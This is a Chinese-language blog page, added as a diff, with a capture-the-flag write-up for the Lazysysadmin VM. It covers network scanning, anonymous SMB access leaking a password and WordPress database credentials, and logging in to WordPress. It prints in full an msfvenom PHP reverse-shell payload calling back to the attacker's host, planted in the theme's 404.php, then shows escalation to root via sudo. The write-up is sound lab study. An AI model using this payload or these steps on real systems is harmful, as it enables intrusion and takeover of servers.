@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="saulGoodman">
+
+
+
+
+
+<title>CTF-Lazysysadmin-WriteUP，通过SMB空密码泄露铭感文件再到Wordpress获取Shell拿到Flag | 渗透攻击红队-专注于渗透红队攻击</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">saulGoodman</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">saulGoodman</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">Posts</a>
+                
+                    <a class="menu-item" href="/category">Categories</a>
+                
+                    <a class="menu-item" href="/tag">Tags</a>
+                
+                    <a class="menu-item" href="/about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">CTF-Lazysysadmin-WriteUP，通过SMB空密码泄露铭感文件再到Wordpress获取Shell拿到Flag</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">saulGoodman</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">December 22, 2019&nbsp;&nbsp;19:36:15</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=499793306&auto=1&height=66"></iframe>
+
+<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/800.png" alt="图片"></p>
+<p>HackNmme：Lazysysadmin<br>Task：Get /root/proof.txt</p>
+<h2 id="学习到的知识点"><a href="#学习到的知识点" class="headerlink" title="学习到的知识点"></a>学习到的知识点</h2><p><code>SMB</code>协议：<code>print$</code>(打印机服务)、<code>share$</code>（共享文件夹服务）、<code>IPC$</code>（空链接）<br>通过<code>Wordpress</code>后台的<code>404</code>页面拿<code>Webshell</code></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>查看 <code>eth0</code> 网卡的 <code>10.10.10.1</code> <code>C段</code>下有那些主机：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 10.10.10.1/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/801.png" alt="图片"></p>
+<p>其中，<code>10.10.10.133</code> 是我们的靶机<code>IP</code>！接着用<code>NMAP</code>扫描端口开放服务：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 10.10.10.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/802.png" alt="图片"></p>
+<p>它总共开放了：<code>22</code>,<code>80</code>,<code>139</code>,<code>445</code>,<code>3306</code>,<code>6667</code>端口！我们先通过<code>web</code>端下手：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL = http://10.10.10.133/</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/803.png" alt="图片"></p>
+<p>接着习惯性的用<code>KALI</code>自带的<code>dirb</code>扫一下它的目录：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://10.10.10.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/804.png" alt="图片"></p>
+<h2 id="SMB协议空密码获取铭感文件"><a href="#SMB协议空密码获取铭感文件" class="headerlink" title="SMB协议空密码获取铭感文件"></a>SMB协议空密码获取铭感文件</h2><p>先让它扫着，我们继续找其他突破口，通过刚刚的<code>NMAP</code>扫描结果得出它开放了<code>SMB</code>协议（是一种在局域网上共享文件和打印机的一种通信协议，它为局域网的不同计算机之间提供文件及打印机等资源的共享服务），我们尝试看看能不能连接到它的<code>SMB</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 10.10.10.133</span><br><span class="line">-L 指定一个IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/805.png" alt="图片"></p>
+<p>用 <code>smbclient</code> 连接到 <code>10.10.10.133</code> 的 <code>SMB</code> 协议的时候，从上图得知他弹出要密码，但是我没有密码使用<code>空密码</code>尝试连接，结果连接成功返回以上信息！通过上图我们得知它有三个服务：<code>print$</code>（打印机服务器）、<code>share$</code>（共享文件夹）、<code>$IPC</code>（空链接），我们尝试对他们进行<code>空密码</code>连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\10.10.10.133\share$&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/806.png" alt="图片"></p>
+<p>通过尝试用<code>空密码</code>连接<code>打印机服务</code>失败，而连接到<code>共享文件夹服务</code>成功！</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/807.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get deets.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/808.png" alt="图片"></p>
+<p>通过把 <code>deets.txt</code> 文件下载到本地，发现是一个密码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CBF Remembering all these passwords.</span><br><span class="line"></span><br><span class="line">Remember to remove this file and update your password after we push out the server.</span><br><span class="line"></span><br><span class="line">Password 12345</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/809.png" alt="图片"></p>
+<p>接着又通过切换到 <code>wordpress</code> 目录下发现了一个 <code>wp-config.php</code> 配置文件，使用 <code>get</code> 命令把它下载到本地：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get wp-config.php </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/810.png" alt="图片"></p>
+<p>通过 <code>gedit</code> 打开 <code>wp-config.php</code> 发现了它的<code>数据库连接</code>信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// ** MySQL settings - You can get this info from your web host ** //</span><br><span class="line"></span><br><span class="line">/** The name of the database for WordPress */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_NAME&#x27;, &#x27;wordpress&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_USER&#x27;, &#x27;Admin&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_PASSWORD&#x27;, &#x27;TogieMYSQL12345^^&#x27;);</span><br><span class="line"></span><br><span class="line">/** MySQL hostname */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_HOST&#x27;, &#x27;localhost&#x27;);</span><br><span class="line"></span><br><span class="line">/** Database Charset to use in creating database tables. */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_CHARSET&#x27;, &#x27;utf8&#x27;);</span><br><span class="line"></span><br><span class="line">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span><br><span class="line"></span><br><span class="line">define(&#x27;DB_COLLATE&#x27;, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/811.png" alt="图片"></p>
+<p>从上图得知，他的数据库名是 <code>wordpress</code>，用户名是 <code>Admin</code>，密码为 <code>TogieMYSQL12345^^</code>，这个时候我尝试看看能不能登录到它数据库里：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 10.10.10.133 -u Admin -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/812.png" alt="图片"></p>
+<p>输入密码后发现登录不进去，可能是关掉了外联。额，这个时候回到刚刚扫描的 <code>web</code> ，发现是用 <code>wordpress</code> 的<code>CMS</code>，然后后台也扫描出来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.133/wordpress/wp-login.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/813.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/814.png" alt="图片"></p>
+<h2 id="通过Wordpress的404页面拿shell"><a href="#通过Wordpress的404页面拿shell" class="headerlink" title="通过Wordpress的404页面拿shell"></a>通过Wordpress的404页面拿shell</h2><p>通过刚刚 <code>get</code> 下来的数据库账号密码尝试登陆 <code>wordpress</code> ：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER: Admin</span><br><span class="line">PASS: TogieMYSQL12345^^</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/815.png" alt="图片"></p>
+<p>成功登陆到 <code>wordpress</code>，接下来就是用 <code>MSF</code> 来生成一个 <code>php</code>的木马来得到网站权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.128 lport=4444 -f raw</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/816.png" alt="图片"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/**/</span> error_reporting(<span class="number">0</span>); <span class="variable">$ip</span> = <span class="string">&#x27;10.10.10.128&#x27;</span>; <span class="variable">$port</span> = <span class="number">4444</span>; <span class="keyword">if</span> ((<span class="variable">$f</span> = <span class="string">&#x27;stream_socket_client&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="string">&quot;tcp://<span class="subst">&#123;$ip&#125;</span>:<span class="subst">&#123;$port&#125;</span>&quot;</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;fsockopen&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="variable">$s_type</span> = <span class="string">&#x27;stream&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s</span> &amp;&amp; (<span class="variable">$f</span> = <span class="string">&#x27;socket_create&#x27;</span>) &amp;&amp; is_callable(<span class="variable">$f</span>)) &#123; <span class="variable">$s</span> = <span class="variable">$f</span>(AF_INET, SOCK_STREAM, SOL_TCP); <span class="variable">$res</span> = @socket_connect(<span class="variable">$s</span>, <span class="variable">$ip</span>, <span class="variable">$port</span>); <span class="keyword">if</span> (!<span class="variable">$res</span>) &#123; <span class="keyword">die</span>(); &#125; <span class="variable">$s_type</span> = <span class="string">&#x27;socket&#x27;</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$s_type</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket funcs&#x27;</span>); &#125; <span class="keyword">if</span> (!<span class="variable">$s</span>) &#123; <span class="keyword">die</span>(<span class="string">&#x27;no socket&#x27;</span>); &#125; <span class="keyword">switch</span> (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$len</span> = fread(<span class="variable">$s</span>, <span class="number">4</span>); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$len</span> = socket_read(<span class="variable">$s</span>, <span class="number">4</span>); <span class="keyword">break</span>; &#125; <span class="keyword">if</span> (!<span class="variable">$len</span>) &#123; <span class="keyword">die</span>(); &#125; <span class="variable">$a</span> = unpack(<span class="string">&quot;Nlen&quot;</span>, <span class="variable">$len</span>); <span class="variable">$len</span> = <span class="variable">$a</span>[<span class="string">&#x27;len&#x27;</span>]; <span class="variable">$b</span> = <span class="string">&#x27;&#x27;</span>; <span class="keyword">while</span> (strlen(<span class="variable">$b</span>) &lt; <span class="variable">$len</span>) &#123; <span class="keyword">switch</span> (<span class="variable">$s_type</span>) &#123; <span class="keyword">case</span> <span class="string">&#x27;stream&#x27;</span>: <span class="variable">$b</span> .= fread(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="keyword">break</span>; <span class="keyword">case</span> <span class="string">&#x27;socket&#x27;</span>: <span class="variable">$b</span> .= socket_read(<span class="variable">$s</span>, <span class="variable">$len</span>-strlen(<span class="variable">$b</span>)); <span class="keyword">break</span>; &#125; &#125; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock&#x27;</span>] = <span class="variable">$s</span>; <span class="variable">$GLOBALS</span>[<span class="string">&#x27;msgsock_type&#x27;</span>] = <span class="variable">$s_type</span>; <span class="keyword">if</span> (extension_loaded(<span class="string">&#x27;suhosin&#x27;</span>) &amp;&amp; ini_get(<span class="string">&#x27;suhosin.executor.disable_eval&#x27;</span>)) &#123; <span class="variable">$suhosin_bypass</span>=create_function(<span class="string">&#x27;&#x27;</span>, <span class="variable">$b</span>); <span class="variable">$suhosin_bypass</span>(); &#125; <span class="keyword">else</span> &#123; <span class="keyword">eval</span>(<span class="variable">$b</span>); &#125; <span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>打开 <code>msfconsole</code> 控制台进行监听：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/817.png" alt="图片"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  10.10.10.128     yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+
+<p>最后来到 <code>Appearance</code> - <code>Editor</code>，修改网站的 <code>404.php</code> 页面，其中的代码就是刚刚 <code>MSF</code> 生成的 <code>payload</code>：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/818.png" alt="图片"></p>
+<p>通过访问 <code>404.php</code> 反弹得到一个 <code>shell</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.10.10.133/wordpress/wp-content/themes/twentyfifteen/404.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/819.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/820.png" alt="图片"></p>
+<p>发现是一个 <code>www-data</code> 的用户，权限有点小…，我们切换到 <code>bash</code> ：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/821.png" alt="图片"></p>
+<p>通过查看 <code>passwd</code> 文件，我发现了一个用户：<code>togie</code></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/822.png" alt="图片"></p>
+<p>通过 <code>su</code> 切换到 <code>togie</code> 用户，密码是<code>12345</code>（就是之前通过share共享文件夹服务得到的密码）成功登陆到 <code>togie</code> 这个用户：</p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/823.png" alt="图片"></p>
+<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>先来查看能执行那些 <code>root</code> 权限的命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/824.png" alt="图片"></p>
+<p>从上图得知，可以执行所有的命令！那么我就直接切换到 <code>root</code> 用户：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/825.png" alt="图片"></p>
+<p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/826.png" alt="图片"></p>
+<p>成功获取 <code>proof.txt</code> 文件！</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过<code>SMB</code>协议连接到共享文件夹服务，得到一个密码<code>12345</code>和网站<code>数据库配置信息</code>；接着通过得到的数据库配置信息尝试登陆 <code>wordpress</code>后台，登陆成功后使用<code>MSF</code>得到一枚<code>shell</code>，最后登陆到<code>togie</code>用户之后切换到 <code>root</code> ，最终拿到 <code>proof.txt</code>文件！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>saulGoodman</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://example.com/2019/12/22/CTF-Lazysysadmin/">http://example.com/2019/12/22/CTF-Lazysysadmin/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>Do you believe in <strong>DESTINY</strong>?</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"># 渗透测试</a>
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"># 权限提升</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/12/26/CTF-Covfefe/">CTF-Covfefe_WriteUp，通过SSH私钥泄露再到程序溢出提权得到Flag</a>
+            
+            
+            <a class="next" rel="next" href="/2019/12/16/CTF-Born2Root/">CTF-Born2root's-WriteUP，通过定时任务反弹shell再到Hadry暴力枚举SSH拿到Flag</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© saulGoodman | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
